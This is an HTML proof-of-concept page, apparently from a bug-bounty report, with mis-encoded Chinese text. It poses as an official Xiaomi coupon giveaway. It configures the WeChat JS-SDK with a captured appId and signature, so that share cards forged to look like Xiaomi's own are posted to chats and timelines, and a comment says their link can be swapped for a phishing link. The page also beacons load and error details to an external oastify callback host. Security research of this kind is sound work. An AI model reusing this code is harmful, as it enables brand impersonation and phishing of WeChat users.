<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>å°ç±³å®˜æ–¹æ´»åŠ¨</title>
  <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 20px; background: #f9f9f9; }
    .card { max-width: 500px; margin: 0 auto; background: white; border-radius: 12px; padding: 24px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    h2 { color: #ff6700; text-align: center; }
    p { line-height: 1.6; color: #333; }
    .status { margin-top: 20px; padding: 12px; background: #eef5ff; border-radius: 6px; font-size: 14px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>ğŸ å°ç±³å®˜æ–¹ç¦åˆ©</h2>
    <p>æ­å–œæ‚¨è·å¾— <strong>200å…ƒæ— é—¨æ§›ä¼˜æƒ åˆ¸</strong>ï¼ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®ç«‹å³é¢†å–ã€‚</p>
    <div class="status" id="status">æ­£åœ¨åˆå§‹åŒ–å¾®ä¿¡åˆ†äº«...</div>
  </div>

  <script>
    // === Step 1: è§¦å‘ oastify å›è¿ï¼ˆè¯æ˜é¡µé¢è¢«åŠ è½½ï¼‰===
    (function() {
      let img = new Image();
      img.src = "https://3lpb7flbsla2fq8s17ul6zkd147vvlja.oastify.com/poc-loaded?ts=" + Date.now();
      console.log("âœ… å·²è§¦å‘ oastify å›è¿ï¼špoc-loaded");
    })();

    // === Step 2: ä½¿ç”¨çœŸå®ç­¾åé…ç½®å¾®ä¿¡ SDK ===
    const WX_CONFIG = {
      appId: "wx70235b639e166c08",
      timestamp: 1763476515,          // â† æ•°å­—ç±»å‹ï¼ä¸è¦å¼•å·
      nonceStr: "HKCQ538Ip1bBZ6CU",
      signature: "1cee63a9101744902bde4f2db8b85d4ce1a4cba6",
      jsApiList: [
        'updateAppMessageShareData',
        'updateTimelineShareData'
      ],
      openTagList: [] // å¯é€‰
    };

    wx.config(WX_CONFIG);

    wx.ready(() => {
      document.getElementById('status').innerText = 'âœ… å¾®ä¿¡åˆ†äº«å·²é…ç½®æˆåŠŸï¼';
      document.getElementById('status').style.background = '#e6f4ea';

      // å†æ¬¡å›è¿ï¼šè¯æ˜ wx.ready è§¦å‘
      let img2 = new Image();
      img2.src = "https://3lpb7flbsla2fq8s17ul6zkd147vvlja.oastify.com/wx-ready?ts=" + Date.now();
      console.log("âœ… wx.ready è§¦å‘ï¼Œç­¾åæœ‰æ•ˆï¼");

      // é…ç½®åˆ†äº«å†…å®¹ï¼ˆä¼ªé€ å°ç±³å®˜æ–¹å¡ç‰‡ï¼‰
      wx.updateAppMessageShareData({
        title: 'ã€å°ç±³å®˜æ–¹ã€‘æ­å–œï¼è·å¾—200å…ƒæ— é—¨æ§›åˆ¸',
        desc: 'é™æ—¶é¢†å–ï¼Œç«‹å³åˆ°è´¦',
        link: 'https://geniusyutong.github.io/xiaomi-poc/', // å¯æ›¿æ¢ä¸ºé’“é±¼é“¾æ¥
        imgUrl: 'https://i.imgur.com/5kR7FQl.png' // å°ç±³LOGOç¤ºä¾‹å›¾
      });

      wx.updateTimelineShareData({
        title: 'ã€å°ç±³å®˜æ–¹ã€‘æ­å–œï¼è·å¾—200å…ƒæ— é—¨æ§›åˆ¸',
        link: 'https://geniusyutong.github.io/xiaomi-poc/',
        imgUrl: 'https://i.imgur.com/5kR7FQl.png'
      });
    });

    wx.error((err) => {
      const msg = 'âŒ å¾®ä¿¡é…ç½®å¤±è´¥: ' + JSON.stringify(err);
      document.getElementById('status').innerText = msg;
      document.getElementById('status').style.background = '#fce8e6';
      console.error(msg);

      // å›è¿é”™è¯¯è¯¦æƒ…ï¼ˆç”¨äºè°ƒè¯•ï¼‰
      let img3 = new Image();
      img3.src = "https://3lpb7flbsla2fq8s17ul6zkd147vvlja.oastify.com/wx-error?msg=" + encodeURIComponent(JSON.stringify(err));
    });
  </script>
</body>
</html>
